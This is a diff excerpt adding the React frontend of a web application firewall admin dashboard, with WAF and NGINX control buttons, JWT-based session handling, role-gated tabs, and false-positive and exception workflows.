+                      <AlertTriangle size={18} color="#ef4444" />
+                      System Overrides
+                    </div>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Restart ModSecurity WAF Engine</span>
+                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Force service instance container reload</span>
+                        </div>
+                        <button type="button" onClick={() => setDangerModal('restart')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
+                          Restart Engine
+                        </button>
+                      </div>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Reload System NGINX Proxy</span>
+                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Rebuild active NGINX process configurations</span>
+                        </div>
+                        <button type="button" onClick={() => setDangerModal('nginx')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
+                          Reload NGINX
+                        </button>
+                      </div>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Purge Local UI Cache</span>
+                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Invalidate local storage metrics data cache</span>
+                        </div>
+                        <button type="button" onClick={() => setDangerModal('cache')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
+                          Purge Cache
+                        </button>
+                      </div>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', background: 'rgba(239,68,68,0.04)', borderRadius: '10px', border: '1px solid rgba(239,68,68,0.1)' }}>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                          <span style={{ fontSize: '14px', fontWeight: 600, color: '#fca5a5' }}>Sync Signatures (OWASP CRS)</span>
+                          <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Download and synchronize latest CRS rules</span>
+                        </div>
+                        <button type="button" onClick={() => setDangerModal('sync')} className="action-btn-inspect" style={{ background: 'rgba(239,68,68,0.15)', color: '#fca5a5', borderColor: 'rgba(239,68,68,0.3)', padding: '8px 16px' }}>
+                          Sync Signatures
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </motion.div>
+            )}
+
+          </AnimatePresence>
+        </div>
+      </div>
+    </motion.div>
+  );
+}
+
+function App() {
+  const [activeTab, setActiveTab] = useState('analytics');
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [userRole, setUserRole] = useState(null);
+  const [username, setUsername] = useState(null);
+  const [logToFlag, setLogToFlag] = useState(null);
+  const [isFpModalOpen, setIsFpModalOpen] = useState(false);
+  const [logToExclude, setLogToExclude] = useState(null);
+  const [isExceptionModalOpen, setIsExceptionModalOpen] = useState(false);
+  const [globalSuccessMsg, setGlobalSuccessMsg] = useState('');
+  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
+
+  const handleTriggerMarkFp = (log) => {
+    setLogToFlag(log);
+    setIsFpModalOpen(true);
+  };
+
+  const handleTriggerCreateException = (log) => {
+    setLogToExclude(log);
+    setIsExceptionModalOpen(true);
+  };
+
+  const handleSaveFalsePositive = async (logId, note) => {
+    try {
+      await markFalsePositive(logId, note);
+      setGlobalSuccessMsg("Log entry marked as False Positive!");
+      setTimeout(() => setGlobalSuccessMsg(''), 3000);
+    } catch (err) {
+      console.error("Failed to flag false positive", err);
+      alert(err.message || "Failed to mark false positive entry.");
+    }
+  };
+
+  const handleSaveException = async (payload) => {
+    try {
+      await createExclusion(payload);
+      setGlobalSuccessMsg("Exception policy created & WAF synchronized!");
+      setTimeout(() => setGlobalSuccessMsg(''), 3000);
+
+      if (payload.false_positive_id) {
+        await updateFalsePositiveStatus(payload.false_positive_id, 'Resolved');
+      }
+    } catch (err) {
+      console.error("Failed to apply WAF exception", err);
+      alert(err.message || "Failed to commit exclusion rule.");
+    }
+  };
+
+  const handleLogout = () => {
+    localStorage.removeItem('waf_token');
+    setIsAuthenticated(false);
+    setUserRole(null);
+    setUsername(null);
+  };
+
+  useEffect(() => {
+    const handleUnauthorized = () => {
+      handleLogout();
+    };
+    window.addEventListener('waf-unauthorized', handleUnauthorized);
+
+    let timer = null;
+
+    const token = localStorage.getItem('waf_token');
+    if (token) {
+      const decoded = parseJwt(token);
+      if (decoded) {
+        const isExpired = decoded.exp ? (decoded.exp * 1000 < Date.now()) : false;
+        if (isExpired) {
+          timer = setTimeout(() => {
+            handleLogout();
+          }, 0);
+        } else {
+          timer = setTimeout(() => {
+            setIsAuthenticated(true);
+            setUserRole(decoded.role || 'analyst');
+            setUsername(decoded.sub || 'user');
+          }, 0);
+        }
+      } else {
+        timer = setTimeout(() => {
+          handleLogout();
+        }, 0);
+      }
+    } else {
+      timer = setTimeout(() => {
+        setIsAuthenticated(false);
+        setUserRole(null);
+        setUsername(null);
+      }, 0);
+    }
+
+    return () => {
+      window.removeEventListener('waf-unauthorized', handleUnauthorized);
+      if (timer) clearTimeout(timer);
+    };
+  }, [isAuthenticated]);
+
+  useEffect(() => {
+    if (activeTab === 'settings' && userRole === 'analyst') {
+      const timer = setTimeout(() => {
+        setActiveTab('analytics');
+      }, 0);
+      return () => clearTimeout(timer);
+    }
+  }, [activeTab, userRole]);
+
+  if (!isAuthenticated) {
+    return <Login setAuth={setIsAuthenticated} />;
+  }
+
+  return (
+    <div className="app-container">
+      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} handleLogout={handleLogout} userRole={userRole} collapsed={sidebarCollapsed} setCollapsed={setSidebarCollapsed} />
+      <div className={`main-content ${sidebarCollapsed ? 'expanded' : ''}`}>
+        <div className="page-header" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
+          <h1 className="page-title">
+            {activeTab === 'analytics' && 'WAF Dashboard'}
+            {activeTab === 'logs' && 'Real-Time Logging'}
+            {activeTab === 'ml_engine' && 'AI/ML Security Engine'}
+            {activeTab === 'false_positives' && 'False Positives'}
+            {activeTab === 'exceptions' && 'Exceptions & Exclusions'}
+            {activeTab === 'rules' && 'Rule Configuration'}
+            {activeTab === 'api_protection' && 'API Protection'}
+            {activeTab === 'ddos_bot' && 'Bot & DDoS Mitigation'}
+            {activeTab === 'integrations' && 'Service Health'}
+            {activeTab === 'settings' && 'System Settings'}
+          </h1>
+
+          <div className="user-profile-badge" style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'rgba(255, 255, 255, 0.03)', border: '1px solid rgba(255, 255, 255, 0.08)', padding: '6px 14px', borderRadius: '20px' }}>
+            <span style={{ fontSize: '12px', color: '#a1a1aa', fontWeight: 500 }}>@{username}</span>
+            <span className={`role-badge role-${(userRole || 'analyst').toLowerCase()}`} style={{
+              fontSize: '10px',
+              fontWeight: 700,
+              padding: '2px 8px',
+              borderRadius: '10px',
+              textTransform: 'uppercase',
+              background: userRole === 'admin' ? 'rgba(239, 68, 68, 0.15)' : 'rgba(59, 130, 246, 0.15)',
+              color: userRole === 'admin' ? '#fca5a5' : '#93c5fd',
+              border: userRole === 'admin' ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(59, 130, 246, 0.3)'
+            }}>
+              {userRole}
+            </span>
+          </div>
+        </div>
+
+        <motion.div
+          style={{ flex: 1, minHeight: 0 }}
+          key={activeTab}
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ duration: 0.15 }}
+        >
+          {activeTab === 'logs' && <LiveLogs key="logs" onMarkFalsePositive={handleTriggerMarkFp} />}
+          {activeTab === 'false_positives' && <FalsePositives key="false_positives" userRole={userRole} onCreateException={handleTriggerCreateException} />}
+          {activeTab === 'exceptions' && <Exceptions key="exceptions" />}
+          {activeTab === 'rules' && <Rules key="rules" userRole={userRole} />}
+          {activeTab === 'analytics' && <ThreatAnalytics key="analytics" />}
+          {activeTab === 'ml_engine' && <MLAnalytics key="ml_engine" />}
+          {activeTab === 'api_protection' && <ApiProtection key="api_protection" />}
+          {activeTab === 'ddos_bot' && <DdosBotMitigation key="ddos_bot" />}
+          {activeTab === 'integrations' && <Integrations key="integrations" />}
+          {activeTab === 'settings' && userRole === 'admin' && <Settings key="settings" onLogout={handleLogout} />}
+        </motion.div>
+
+        <FlagFpModal
+          isOpen={isFpModalOpen}
+          log={logToFlag}
+          onClose={() => {
+            setIsFpModalOpen(false);
+            setLogToFlag(null);
+          }}
+          onSubmit={handleSaveFalsePositive}
+        />
+
+        <CreateExceptionModal
+          isOpen={isExceptionModalOpen}
+          log={logToExclude}
+          onClose={() => {
+            setIsExceptionModalOpen(false);
+            setLogToExclude(null);
+          }}
+          onSubmit={handleSaveException}
+        />
+
+        <AnimatePresence>
+          {globalSuccessMsg && (
+            <motion.div
+              initial={{ opacity: 0, y: -20 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -20 }}
+              style={{
+                position: 'fixed', top: '24px', right: '24px', background: '#10b981', color: '#000',
+                padding: '12px 24px', borderRadius: '8px', zIndex: 10000, fontWeight: 600, display: 'flex', gap: '8px', alignItems: 'center',
+                boxShadow: '0 10px 15px -3px rgba(16, 185, 129, 0.4)'
+              }}
+            >
+              <ShieldCheck size={18} />
+              <span>{globalSuccessMsg}</span>
+            </motion.div>
+          )}
+        </AnimatePresence>
+      </div>
+    </div>
+  );
+}
+
+export default App;
+
